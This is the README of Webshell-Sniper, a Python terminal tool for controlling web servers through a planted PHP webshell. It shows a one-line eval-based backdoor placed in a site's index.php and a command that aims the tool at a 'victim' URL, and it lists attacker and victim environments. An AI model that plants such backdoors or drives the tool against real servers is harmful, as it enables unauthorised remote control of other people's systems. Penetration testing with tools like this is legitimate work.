# Webshell-Sniper
A webshell manager via terminal

[![Backers on Open Collective](https://opencollective.com/Webshell-Sniper/backers/badge.svg)](#backers)
[![Sponsors on Open Collective](https://opencollective.com/Webshell-Sniper/sponsors/badge.svg)](#sponsors) 

#### Usage :
```
Usage : 
        python webshell-sniper.py [URL] [METHOD] [AUTH]
Example : 
        python webshell-sniper.py http://127.0.0.1/c.php POST c
Author : 
        WangYihang <wangyihanger@gmail.com>
```
```
# cat /var/www/html/index.php
<?php eval($_POST['s3cr3t']);?>
# python webshell-sniper.py http://victim.com/index.php POST s3cr3t
...
```

#### Installation:
```
git clone https://github.com/WangYihang/Webshell-Sniper
cd Webshell-Sniper
pip install -r requirements.txt
```

#### Example : 

> v1.1.2

[![A Pentest Example via Webshell-Sniper (YouTube)](./images/pentest_0.png)](https://www.youtube.com/watch?v=iAUwb8SSS4s)

#### Compatibility :
```
Enviroment :
    Attacker :
        Linux
        python 2.7
    Victim :
        apache 2.4
        php 7.0
```

#### Addations:
1. This tool only support to run on unix-like system.
2. It is able to help user control web server which is running PHP or MySQL.

## Contributors

This project exists thanks to all the people who contribute. 
<a href="https://github.com/WangYihang/Webshell-Sniper/graphs/contributors"><img src="https://opencollective.com/Webshell-Sniper/contributors.svg?width=890&button=false" /></a>


## Backers

Thank you to all our backers! 🙏 [[Become a backer](https://opencollective.com/Webshell-Sniper#backer)]

<a href="https://opencollective.com/Webshell-Sniper#backers" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/backers.svg?width=890"></a>


## Sponsors

Support this project by becoming a sponsor. Your logo will show up here with a link to your website. [[Become a sponsor](https://opencollective.com/Webshell-Sniper#sponsor)]

<a href="https://opencollective.com/Webshell-Sniper/sponsor/0/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/0/avatar.svg"></a>
<a href="https://opencollective.com/Webshell-Sniper/sponsor/1/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/1/avatar.svg"></a>
<a href="https://opencollective.com/Webshell-Sniper/sponsor/2/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/2/avatar.svg"></a>
<a href="https://opencollective.com/Webshell-Sniper/sponsor/3/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/3/avatar.svg"></a>
<a href="https://opencollective.com/Webshell-Sniper/sponsor/4/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/4/avatar.svg"></a>
<a href="https://opencollective.com/Webshell-Sniper/sponsor/5/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/5/avatar.svg"></a>
<a href="https://opencollective.com/Webshell-Sniper/sponsor/6/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/6/avatar.svg"></a>
<a href="https://opencollective.com/Webshell-Sniper/sponsor/7/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/7/avatar.svg"></a>
<a href="https://opencollective.com/Webshell-Sniper/sponsor/8/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/8/avatar.svg"></a>
<a href="https://opencollective.com/Webshell-Sniper/sponsor/9/website" target="_blank"><img src="https://opencollective.com/Webshell-Sniper/sponsor/9/avatar.svg"></a>


